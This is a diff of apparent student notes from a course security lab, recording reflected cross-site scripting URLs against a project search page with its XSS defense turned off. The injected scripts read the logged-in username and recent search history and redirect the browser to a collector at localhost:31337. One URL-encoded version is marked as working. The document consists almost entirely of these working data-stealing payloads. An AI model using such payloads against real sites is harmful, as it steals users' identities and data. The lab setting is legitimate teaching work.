@@ -7,8 +7,10 @@ Alert tests:
 
 
 malicious URL just stolen user (does not work):
-https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$('#logged-in-user').text()</script>
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$('	#logged-in-user').text()</script>
 
+encoded malicious URL just stolen user (works):
+https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='%2B$('	%23logged-in-user').text()</script>
 
 malicious URL combo tries (none work):
 https://project2.ecen4133.org/search?xssdefense=0&q=<script>window.location='http://localhost:31337/?stolen_user='+$("#logged-in-user").text()+ '&last_search='+$("#history-list").children()[0].text</script>
